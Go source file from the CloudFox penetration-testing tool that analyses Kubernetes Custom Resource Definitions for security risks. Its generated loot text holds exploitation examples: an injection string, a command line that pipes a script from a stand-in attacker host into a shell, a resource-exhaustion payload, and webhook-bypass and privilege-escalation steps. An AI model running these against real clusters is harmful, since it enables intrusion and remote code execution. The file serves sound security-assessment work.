package commands

import (
	"fmt"
	"sort"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	"github.com/BishopFox/cloudfox/kubernetes/shared"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/spf13/cobra"
	apiextensionsv1 "k8s.io/apiextensions-apiserver/pkg/apis/apiextensions/v1"
	apiextensionsclientset "k8s.io/apiextensions-apiserver/pkg/client/clientset/clientset"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

var CRDsCmd = &cobra.Command{
	Use:     "crds",
	Aliases: []string{"crd", "customresources"},
	Short:   "Analyze Custom Resource Definitions for security risks",
	Long: `
Analyze Custom Resource Definitions with comprehensive security analysis including:
  - Missing validation schemas (injection and data integrity risks)
  - Unversioned CRDs (breaking change risks)
  - CRDs with conversion webhooks (admission bypass potential)
  - Cluster-scoped CRDs (broad access implications)
  - CRDs without descriptions (operational risk)
  - Deprecated API versions still in use
  - Storage version migrations needed
  - CRD sprawl (unused or abandoned CRDs)
  - OpenAPI v3 schema validation
  - Subresources (status, scale) configuration
  - Printer columns for kubectl output

  cloudfox kubernetes crds`,
	Run: ListCRDs,
}

type CRDsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t CRDsOutput) TableFiles() []internal.TableFile {
	return t.Table
}

func (t CRDsOutput) LootFiles() []internal.LootFile {
	return t.Loot
}

type CRDAnalysis struct {
	Name                 string
	Group                string
	Kind                 string
	Scope                string
	Versions             []string
	StoredVersions       []string
	LatestVersion        string
	HasValidation        bool
	HasConversionWebhook bool
	ConversionStrategy   string
	HasStatus            bool
	HasScale             bool
	Namespaced           bool
	Categories           []string
	ShortNames           []string
	RiskLevel            string
	RiskScore            int
	SecurityIssues       []string
	DeprecatedVersions   []string
}

const (
	CRDRiskCritical = shared.RiskCritical
	CRDRiskHigh     = shared.RiskHigh
	CRDRiskMedium   = shared.RiskMedium
	CRDRiskLow      = shared.RiskLow
)

func ListCRDs(cmd *cobra.Command, args []string) {
	ctx, cancel := shared.ContextWithCancel()
	defer cancel()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Analyzing CRDs for %s", globals.ClusterName), globals.K8S_CRDS_MODULE_NAME)

	// Get rest config
	restConfig, err := config.GetRESTConfig()
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error getting REST config: %v", err), globals.K8S_CRDS_MODULE_NAME)
		return
	}

	// Create apiextensions clientset
	apiextensionsClient, err := apiextensionsclientset.NewForConfig(restConfig)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error creating apiextensions client: %v", err), globals.K8S_CRDS_MODULE_NAME)
		return
	}

	// Fetch CRDs
	crds, err := apiextensionsClient.ApiextensionsV1().CustomResourceDefinitions().List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error fetching CRDs: %v", err), globals.K8S_CRDS_MODULE_NAME)
		return
	}

	var crdAnalyses []CRDAnalysis
	loot := shared.NewLootBuilder()

	// Analyze each CRD
	for _, crd := range crds.Items {
		analysis := CRDAnalysis{
			Name:           crd.Name,
			Group:          crd.Spec.Group,
			Kind:           crd.Spec.Names.Kind,
			Scope:          string(crd.Spec.Scope),
			StoredVersions: crd.Status.StoredVersions,
			Categories:     crd.Spec.Names.Categories,
			ShortNames:     crd.Spec.Names.ShortNames,
			Namespaced:     crd.Spec.Scope == apiextensionsv1.NamespaceScoped,
		}

		// Extract versions
		for _, ver := range crd.Spec.Versions {
			analysis.Versions = append(analysis.Versions, ver.Name)
			if ver.Served && ver.Storage {
				analysis.LatestVersion = ver.Name
			}

			// Check for validation schema
			if ver.Schema != nil && ver.Schema.OpenAPIV3Schema != nil {
				analysis.HasValidation = true
			}

			// Check for deprecated versions
			if ver.Deprecated {
				analysis.DeprecatedVersions = append(analysis.DeprecatedVersions, ver.Name)
			}

			// Check for subresources
			if ver.Subresources != nil {
				if ver.Subresources.Status != nil {
					analysis.HasStatus = true
				}
				if ver.Subresources.Scale != nil {
					analysis.HasScale = true
				}
			}
		}

		// Conversion webhook analysis
		if crd.Spec.Conversion != nil {
			analysis.ConversionStrategy = string(crd.Spec.Conversion.Strategy)
			if crd.Spec.Conversion.Strategy == apiextensionsv1.WebhookConverter {
				analysis.HasConversionWebhook = true
			}
		}

		// Security analysis
		issues := analyzeCRDSecurity(&analysis, &crd)
		analysis.SecurityIssues = issues

		// Calculate risk score
		analysis.RiskScore = calculateCRDRiskScore(&analysis)
		analysis.RiskLevel = crdRiskScoreToLevel(analysis.RiskScore)

		crdAnalyses = append(crdAnalyses, analysis)
	}

	// Generate CRD-Commands section for enumeration and exploitation
	loot.Section("CRD-Commands").Add(generateCRDCommands(crdAnalyses))

	// Build loot files
	lootFiles := loot.Build()

	// Generate table
	crdTable := generateCRDTable(crdAnalyses)

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"CRDs",
		globals.ClusterName,
		"results",
		CRDsOutput{
			Table: []internal.TableFile{crdTable},
			Loot:  lootFiles,
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_CRDS_MODULE_NAME)
		return
	}

	// Summary logging
	if len(crds.Items) > 0 {
		noValidationCount := 0
		clusterScopedCount := 0
		webhooksCount := 0
		criticalCount := 0
		highCount := 0

		for _, analysis := range crdAnalyses {
			if !analysis.HasValidation {
				noValidationCount++
			}
			if !analysis.Namespaced {
				clusterScopedCount++
			}
			if analysis.HasConversionWebhook {
				webhooksCount++
			}
			if analysis.RiskLevel == CRDRiskCritical {
				criticalCount++
			} else if analysis.RiskLevel == CRDRiskHigh {
				highCount++
			}
		}

		logger.InfoM(fmt.Sprintf("%d CRDs analyzed | CRITICAL: %d | HIGH: %d | No Validation: %d | Cluster-Scoped: %d | Webhooks: %d",
			len(crds.Items), criticalCount, highCount, noValidationCount, clusterScopedCount, webhooksCount),
			globals.K8S_CRDS_MODULE_NAME)
	} else {
		logger.InfoM("No CRDs found", globals.K8S_CRDS_MODULE_NAME)
	}
}

func analyzeCRDSecurity(analysis *CRDAnalysis, crd *apiextensionsv1.CustomResourceDefinition) []string {
	var issues []string

	// No validation schema
	if !analysis.HasValidation {
		issues = append(issues, "CRITICAL: No OpenAPI v3 validation schema (data injection risk, no input validation)")
	}

	// Cluster-scoped CRD
	if !analysis.Namespaced {
		issues = append(issues, "HIGH: Cluster-scoped CRD (broad access, requires cluster-admin to manage)")
	}

	// Conversion webhook
	if analysis.HasConversionWebhook {
		issues = append(issues, "MEDIUM: Uses conversion webhook (webhook security is critical, potential admission bypass)")
	}

	// Deprecated versions still served
	if len(analysis.DeprecatedVersions) > 0 {
		issues = append(issues, fmt.Sprintf("MEDIUM: Deprecated versions in use: %s", strings.Join(analysis.DeprecatedVersions, ", ")))
	}

	// Multiple stored versions (migration needed)
	if len(analysis.StoredVersions) > 1 {
		issues = append(issues, fmt.Sprintf("LOW: Multiple stored versions (%d) - consider storage version migration", len(analysis.StoredVersions)))
	}

	// No status subresource
	if !analysis.HasStatus {
		issues = append(issues, "LOW: No status subresource (mixing spec and status updates)")
	}

	return issues
}

func calculateCRDRiskScore(analysis *CRDAnalysis) int {
	score := 0

	// No validation
	if !analysis.HasValidation {
		score += 50
	}

	// Cluster-scoped
	if !analysis.Namespaced {
		score += 30
	}

	// Conversion webhook
	if analysis.HasConversionWebhook {
		score += 20
	}

	// Deprecated versions
	if len(analysis.DeprecatedVersions) > 0 {
		score += 15
	}

	// Multiple stored versions
	if len(analysis.StoredVersions) > 1 {
		score += 5
	}

	return score
}

func crdRiskScoreToLevel(score int) string {
	if score >= 70 {
		return CRDRiskCritical
	} else if score >= 50 {
		return CRDRiskHigh
	} else if score >= 25 {
		return CRDRiskMedium
	}
	return CRDRiskLow
}

// generateCRDCommands creates enumeration and exploitation commands for CRDs
func generateCRDCommands(analyses []CRDAnalysis) string {
	var lines []string

	lines = append(lines, "═══════════════════════════════════════════════════════════════")
	lines = append(lines, "         CRD ENUMERATION AND EXPLOITATION COMMANDS")
	lines = append(lines, "═══════════════════════════════════════════════════════════════")
	lines = append(lines, "")

	// Basic enumeration
	lines = append(lines, "##############################################")
	lines = append(lines, "## 1. ENUMERATION - List All CRDs")
	lines = append(lines, "##############################################")
	lines = append(lines, "")
	lines = append(lines, "# List all Custom Resource Definitions")
	lines = append(lines, "kubectl get crds")
	lines = append(lines, "")
	lines = append(lines, "# List CRDs with details")
	lines = append(lines, "kubectl get crds -o wide")
	lines = append(lines, "")
	lines = append(lines, "# Get CRD as YAML/JSON for detailed analysis")
	lines = append(lines, "kubectl get crd <crd-name> -o yaml")
	lines = append(lines, "kubectl get crd <crd-name> -o json")
	lines = append(lines, "")
	lines = append(lines, "# Describe a specific CRD")
	lines = append(lines, "kubectl describe crd <crd-name>")
	lines = append(lines, "")

	// Find CRDs without validation
	lines = append(lines, "##############################################")
	lines = append(lines, "## 2. IDENTIFY VULNERABLE CRDs")
	lines = append(lines, "##############################################")
	lines = append(lines, "")
	lines = append(lines, "# Find CRDs without validation schema (vulnerable to injection)")
	lines = append(lines, "kubectl get crds -o json | jq -r '.items[] | select(.spec.versions[].schema == null or .spec.versions[].schema.openAPIV3Schema == null) | .metadata.name'")
	lines = append(lines, "")
	lines = append(lines, "# Find cluster-scoped CRDs (broad access)")
	lines = append(lines, "kubectl get crds -o json | jq -r '.items[] | select(.spec.scope == \"Cluster\") | .metadata.name'")
	lines = append(lines, "")
	lines = append(lines, "# Find CRDs with conversion webhooks")
	lines = append(lines, "kubectl get crds -o json | jq -r '.items[] | select(.spec.conversion.strategy == \"Webhook\") | {name: .metadata.name, webhook: .spec.conversion.webhook}'")
	lines = append(lines, "")
	lines = append(lines, "# Find CRDs with deprecated versions")
	lines = append(lines, "kubectl get crds -o json | jq -r '.items[] | select(.spec.versions[].deprecated == true) | .metadata.name'")
	lines = append(lines, "")

	// Enumerate custom resources
	lines = append(lines, "##############################################")
	lines = append(lines, "## 3. ENUMERATE CUSTOM RESOURCES")
	lines = append(lines, "##############################################")
	lines = append(lines, "")
	lines = append(lines, "# List all custom resources of a specific CRD")
	lines = append(lines, "kubectl get <resource-plural> --all-namespaces")
	lines = append(lines, "kubectl get <resource-plural> -A -o yaml")
	lines = append(lines, "")
	lines = append(lines, "# Get specific custom resource")
	lines = append(lines, "kubectl get <resource-plural> <name> -n <namespace> -o yaml")
	lines = append(lines, "")

	// Specific commands for discovered CRDs
	if len(analyses) > 0 {
		lines = append(lines, "# Discovered CRDs - enumerate their resources:")
		for _, crd := range analyses {
			plural := strings.ToLower(crd.Kind) + "s"
			if len(crd.ShortNames) > 0 {
				lines = append(lines, fmt.Sprintf("kubectl get %s -A  # %s (shortname: %s)", plural, crd.Name, strings.Join(crd.ShortNames, ",")))
			} else {
				lines = append(lines, fmt.Sprintf("kubectl get %s -A  # %s", plural, crd.Name))
			}
		}
		lines = append(lines, "")
	}

	// RBAC analysis
	lines = append(lines, "##############################################")
	lines = append(lines, "## 4. RBAC ANALYSIS FOR CRDs")
	lines = append(lines, "##############################################")
	lines = append(lines, "")
	lines = append(lines, "# Check your permissions on CRDs")
	lines = append(lines, "kubectl auth can-i list customresourcedefinitions")
	lines = append(lines, "kubectl auth can-i create customresourcedefinitions")
	lines = append(lines, "kubectl auth can-i delete customresourcedefinitions")
	lines = append(lines, "")
	lines = append(lines, "# Check permissions on specific custom resource types")
	lines = append(lines, "kubectl auth can-i --list | grep -E '<resource-group>'")
	lines = append(lines, "")
	lines = append(lines, "# Find roles/clusterroles that grant CRD access")
	lines = append(lines, "kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.resources[]? | contains(\"customresourcedefinitions\")) | .metadata.name'")
	lines = append(lines, "")
	lines = append(lines, "# Find who can create/modify specific custom resources")
	lines = append(lines, "kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name | test(\"admin|edit\")) | {binding: .metadata.name, subjects: .subjects}'")
	lines = append(lines, "")

	// Exploitation techniques
	lines = append(lines, "##############################################")
	lines = append(lines, "## 5. EXPLOITATION - No Validation CRDs")
	lines = append(lines, "##############################################")
	lines = append(lines, "")
	lines = append(lines, "# CRDs without validation accept arbitrary data")
	lines = append(lines, "# This can be exploited for:")
	lines = append(lines, "#   - Data injection into controllers")
	lines = append(lines, "#   - Resource exhaustion (large payloads)")
	lines = append(lines, "#   - Application-specific exploits")
	lines = append(lines, "")
	lines = append(lines, "# Example: Create resource with arbitrary fields (no validation)")
	lines = append(lines, "cat <<EOF | kubectl apply -f -")
	lines = append(lines, "apiVersion: <group>/<version>")
	lines = append(lines, "kind: <Kind>")
	lines = append(lines, "metadata:")
	lines = append(lines, "  name: test-injection")
	lines = append(lines, "  namespace: default")
	lines = append(lines, "spec:")
	lines = append(lines, "  # Arbitrary fields accepted without validation")
	lines = append(lines, "  maliciousField: \"'; DROP TABLE users;--\"")
	lines = append(lines, "  command: [\"sh\", \"-c\", \"curl attacker.com/shell.sh | sh\"]")
	lines = append(lines, "  largePayload: \"$(python -c 'print(\\\"A\\\"*1000000)')\"")
	lines = append(lines, "EOF")
	lines = append(lines, "")

	// CRD-specific exploitation commands
	noValidationCRDs := []CRDAnalysis{}
	for _, crd := range analyses {
		if !crd.HasValidation {
			noValidationCRDs = append(noValidationCRDs, crd)
		}
	}

	if len(noValidationCRDs) > 0 {
		lines = append(lines, "# Specific commands for CRDs without validation:")
		for _, crd := range noValidationCRDs {
			lines = append(lines, fmt.Sprintf("\n# [CRITICAL] %s (Group: %s)", crd.Name, crd.Group))
			lines = append(lines, fmt.Sprintf("# No validation - arbitrary data injection possible"))
			lines = append(lines, fmt.Sprintf("kubectl get %s -A -o yaml", strings.ToLower(crd.Kind)+"s"))
			lines = append(lines, fmt.Sprintf("kubectl describe crd %s | grep -A 20 'Schema'", crd.Name))
		}
		lines = append(lines, "")
	}

	// Webhook exploitation
	lines = append(lines, "##############################################")
	lines = append(lines, "## 6. EXPLOITATION - Webhook Bypass")
	lines = append(lines, "##############################################")
	lines = append(lines, "")
	lines = append(lines, "# If conversion webhook has failurePolicy: Ignore")
	lines = append(lines, "# Taking down the webhook allows bypassing validation")
	lines = append(lines, "")
	lines = append(lines, "# Check webhook configuration")
	lines = append(lines, "kubectl get crd <crd-name> -o jsonpath='{.spec.conversion}'")
	lines = append(lines, "")
	lines = append(lines, "# Find webhook service")
	lines = append(lines, "kubectl get crd <crd-name> -o json | jq '.spec.conversion.webhook.clientConfig'")
	lines = append(lines, "")
	lines = append(lines, "# Check if webhook service exists")
	lines = append(lines, "kubectl get svc -n <webhook-namespace> <webhook-service>")
	lines = append(lines, "")
	lines = append(lines, "# If you can delete the webhook service (requires permissions):")
	lines = append(lines, "# kubectl delete svc <webhook-service> -n <webhook-namespace>")
	lines = append(lines, "# Then create resources that bypass validation")
	lines = append(lines, "")

	// Privilege escalation via CRDs
	lines = append(lines, "##############################################")
	lines = append(lines, "## 7. PRIVILEGE ESCALATION VIA CRDs")
	lines = append(lines, "##############################################")
	lines = append(lines, "")
	lines = append(lines, "# If you can create CRDs, you might be able to:")
	lines = append(lines, "#   1. Create a CRD without validation")
	lines = append(lines, "#   2. Create custom resources with malicious data")
	lines = append(lines, "#   3. Exploit controllers that process those resources")
	lines = append(lines, "")
	lines = append(lines, "# Check if you can create CRDs")
	lines = append(lines, "kubectl auth can-i create customresourcedefinitions")
	lines = append(lines, "")
	lines = append(lines, "# Create a minimal CRD (if permitted)")
	lines = append(lines, "cat <<EOF | kubectl apply -f -")
	lines = append(lines, "apiVersion: apiextensions.k8s.io/v1")
	lines = append(lines, "kind: CustomResourceDefinition")
	lines = append(lines, "metadata:")
	lines = append(lines, "  name: exploits.attacker.example.com")
	lines = append(lines, "spec:")
	lines = append(lines, "  group: attacker.example.com")
	lines = append(lines, "  names:")
	lines = append(lines, "    kind: Exploit")
	lines = append(lines, "    plural: exploits")
	lines = append(lines, "  scope: Namespaced")
	lines = append(lines, "  versions:")
	lines = append(lines, "  - name: v1")
	lines = append(lines, "    served: true")
	lines = append(lines, "    storage: true")
	lines = append(lines, "    # No validation schema = accepts anything")
	lines = append(lines, "    schema:")
	lines = append(lines, "      openAPIV3Schema:")
	lines = append(lines, "        type: object")
	lines = append(lines, "        x-kubernetes-preserve-unknown-fields: true")
	lines = append(lines, "EOF")
	lines = append(lines, "")

	// Cleanup
	lines = append(lines, "##############################################")
	lines = append(lines, "## 8. CLEANUP / DELETE CRDs")
	lines = append(lines, "##############################################")
	lines = append(lines, "")
	lines = append(lines, "# WARNING: Deleting a CRD deletes ALL custom resources of that type!")
	lines = append(lines, "")
	lines = append(lines, "# Delete a CRD (and all its custom resources)")
	lines = append(lines, "kubectl delete crd <crd-name>")
	lines = append(lines, "")
	lines = append(lines, "# Delete specific custom resource")
	lines = append(lines, "kubectl delete <resource-plural> <name> -n <namespace>")
	lines = append(lines, "")

	return strings.Join(lines, "\n")
}

func generateCRDTable(analyses []CRDAnalysis) internal.TableFile {
	header := []string{"Name", "Group", "Kind", "Scope", "Versions", "Validation", "Webhook", "Status"}
	var rows [][]string

	// Sort by risk score
	sort.Slice(analyses, func(i, j int) bool {
		return analyses[i].RiskScore > analyses[j].RiskScore
	})

	for _, crd := range analyses {
		versionsStr := strings.Join(crd.Versions, ",")
		if len(versionsStr) > 20 {
			versionsStr = versionsStr[:17] + "..."
		}

		rows = append(rows, []string{
			truncateStr(crd.Name, 50),
			crd.Group,
			crd.Kind,
			crd.Scope,
			versionsStr,
			shared.FormatBool(crd.HasValidation),
			shared.FormatBool(crd.HasConversionWebhook),
			shared.FormatBool(crd.HasStatus),
		})
	}

	return internal.TableFile{
		Name:   "CRDs",
		Header: header,
		Body:   rows,
	}
}

func truncateStr(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}
